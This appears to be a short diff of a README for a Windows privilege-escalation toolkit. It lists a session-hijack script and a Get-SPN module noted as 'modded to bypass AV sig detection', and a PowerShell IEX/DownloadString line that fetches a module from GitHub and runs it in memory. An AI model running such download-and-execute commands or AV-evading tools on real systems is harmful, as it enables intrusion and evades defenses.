@@ -19,12 +19,12 @@ Start-ProcessInSession.ps1 & MS17-012.cs - non-priveleged session hijack
 
 
 
-# Author: Scott Sutherland 2013, NetSPI
-# Version: Get-SPN version 1.1
-# Requirements: Powershell v.3
-# Comments: The technique used to query LDAP was based on the "Get-AuditDSDisabledUserAcount" 
-# function found in Carols Perez's PoshSec-Mod project.#
-# Modded to bypass AV sig detection.
+Author: Scott Sutherland 2013, NetSPI
+Version: Get-SPN version 1.1
+Requirements: Powershell v.3
+Comments: The technique used to query LDAP was based on the "Get-AuditDSDisabledUserAcount" 
+function found in Carols Perez's PoshSec-Mod project.#
+Modded to bypass AV sig detection.
 
 Get-SPM.psm1: 
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/Get-SPM.psm1")
